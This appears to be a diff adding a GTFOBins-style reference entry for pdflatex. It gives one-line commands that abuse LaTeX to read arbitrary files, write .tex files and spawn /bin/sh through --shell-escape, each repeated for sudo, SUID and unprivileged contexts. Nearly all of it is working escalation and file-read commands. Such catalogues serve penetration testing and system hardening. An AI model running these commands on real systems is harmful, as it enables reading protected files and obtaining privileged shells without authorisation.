@@ -1,0 +1,47 @@
+pdflatex
+========
+
+File read
+---------
+
+[Sudo]
+    pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+pdftotext texput.pdf -
+    The read file will be part of the PDF output.
+
+[SUID]
+    pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+pdftotext texput.pdf -
+    The read file will be part of the PDF output.
+
+[Unprivileged]
+    pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+pdftotext texput.pdf -
+    The read file will be part of the PDF output.
+
+File write
+----------
+
+[Sudo]
+    pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+    The file can only be written in the current directory, and the `.tex` extension is mandatory.
+
+[SUID]
+    pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+    The file can only be written in the current directory, and the `.tex` extension is mandatory.
+
+[Unprivileged]
+    pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+    The file can only be written in the current directory, and the `.tex` extension is mandatory.
+
+Shell
+-----
+
+[Sudo]
+    pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+
+[SUID]
+    pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+
+[Unprivileged]
+    pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
